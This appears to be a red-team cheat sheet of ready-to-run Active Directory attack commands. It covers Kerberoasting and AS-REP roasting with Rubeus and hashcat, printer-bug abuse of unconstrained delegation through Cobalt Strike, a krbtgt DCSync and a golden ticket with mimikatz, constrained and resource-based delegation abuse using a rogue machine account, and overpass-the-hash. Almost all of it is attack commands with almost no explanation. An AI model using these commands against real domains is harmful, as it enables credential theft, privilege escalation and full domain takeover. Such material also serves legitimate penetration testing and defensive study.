# Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /domain:dev.insomnia.co.mm
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

# ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
execute-assembly C:\Users\Public\Rubeus.exe asreproast format:hashcat /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe asreproast /domain:dev.insomnia.co.mm
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```

# Unconstrained Delegation

```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe triage
execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe dump /luid:0x44e8a2a
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```

### The Printer Bug Unconstrained Delegation With Cobalt Strike
```
C:\Users\Public\Rubeus.exe monitor /interval:5 
C:\Users\Public\MS-RPRN.exe \\REDACTED \\REDACTED #Another Within the same Beacon
C:\Users\Public\Rubeus.exe ptt /ticket:
C:\Users\Public\mimikatz "lsadump::dcsync /domain:REDACTED /user:finance\krbtgt"
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:REDACTED /sid:S-1-5-21-1708299476-1681750518-2103560891 /krbtgt:REDACTED /ptt"'
```
# Constrained Delegation With Cobalt Strike

```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt 
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John_PC$ /msdsspn:cifs/fs-1.insomnia.io /ticket:
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /altservice:cifs /ticket:
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```



# Resource-based Constrained Delegation
service administrators/owners can configure which domain accounts are allowed to delegate to them.
```
Import-Module .\Powermad.psd1
New-MachineAccount -Domain insomnia.io -DomainController 192.168.100.1 -MachineAccount Evil_genius -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
Set-ADComputer FS1.insomnia.io -PrincipalsAllowedToDelegateToAccount Evil_genius$ -Verbose
Rubeus.exe s4u /user:Evil_genius$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/FS1.insomnia.io /impersonateuser:Administrator /ptt
Enter-PSSession -ComputerName FS1.insomnia.io
```
**If the Compromised machine has GenericAll right over any computer or dedicated machine.**
```
Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Set-ADComputer -Identity Targeted-Machine -PrincipalsAllowedToDelegateToAccount Compromised-Machine$ -Verbose
Set-ADComputer -Identity Web01 -PrincipalsAllowedToDelegateToAccount John-PC$ -Verbose
Rubeus.exe s4u /user:John-PC$ /aes256:<AES256 Key> /msdsspn:time/John-PC$ /impersonateuser:Administrator /ptt
rubeus.exe  ptt /ticket:<>
```

# Overpass-the-Hash
```
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
```
